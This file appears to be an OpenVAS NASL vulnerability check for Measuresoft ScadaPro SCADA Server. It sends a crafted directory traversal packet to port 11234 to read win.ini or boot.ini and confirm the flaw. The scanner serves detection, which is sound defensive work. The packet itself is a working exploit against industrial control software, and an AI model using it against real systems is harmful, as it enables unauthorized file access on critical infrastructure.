###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_measuresoft_scadapro_mult_vuln.nasl 7549 2017-10-24 12:10:14Z cfischer $
#
# Measuresoft ScadaPro Multiple Security Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802047");
  script_version("$Revision: 7549 $");
  script_bugtraq_id(49613);
  script_cve_id("CVE-2011-3495","CVE-2011-3496","CVE-2011-3497","CVE-2011-3490");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-10-24 14:10:14 +0200 (Tue, 24 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-12-19 15:53:58 +0530 (Wed, 19 Dec 2012)");
  script_name("Measuresoft ScadaPro Multiple Security Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(11234);
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://secunia.com/advisories/45973");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17848");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/scadapro_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-11-263-01.pdf");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf");
  script_xref(name:"URL", value:"http://www.measuresoft.net/news/post/Reports-of-Measuresoft-ScadaPro-400-Vulnerability-when-Windows-Firewall-is-switched-Off.aspx");

  tag_impact = "Successful exploitation will allow remote attackers to read, modify, or
  delete arbitrary files and possibly execute arbitrary code.
  Impact Level: System/Application";

  tag_affected = "Measuresoft ScadaPro 4.0.0 and prior";

  tag_insight = "Multiple boundary errors within service.exe when processing certain packets.";

  tag_solution = "Upgrade to Measuresoft ScadaPro 4.0.1 or later,
  http://www.measuresoft.com/products/scadapro-server/scada-server.aspx";

  tag_summary = "The host is running Measuresoft ScadaPro SCADA Server and is prone
  to multiple vulnerabilities.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");

## variable initialization
soc = "";
trav_str = "";
read_req = "";
file_info = "";
scada_port = 0;

## get the port
scada_port = 11234;

## check the port state
if(!get_port_state(scada_port))exit(0);

##  Open tcp socket
soc = open_sock_tcp(scada_port);
if(!soc){
  exit(0);
}

## Directory traversal string
trav_str = crap(length:19, data:'\x5c\x2e\x2e');

## did not use traversal_files() because egrep is not matching the response
## due to non printable characters in the response
files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");

foreach file (files)
{
  ## Construct Complete directory traversal attack
  read_req = string('RF%SCADAPRO', trav_str, file,
             '\x09\x32\x35\x36\x09\x2d\x31\x09\x30\x09\x32\x36\x38\x34\x33',
             '\x35\x34\x35\x36\x09\x33\x09\x30\x09\x34\x09\x30\x09\x30\x00');

  ## Send request to read boot.ini file
  send(socket:soc, data:read_req);

  ## Get boot.ini file details
  file_info = recv(socket:soc, length:2048, timeout:20);

  ## Confirm exploit worked or not
  if("; for 16-bit app support" >< file_info || "[boot loader]" >< file_info)
  {
    security_message(port:scada_port);
    close(soc);
    exit(0);
  }
}

## Close socket
close(soc);
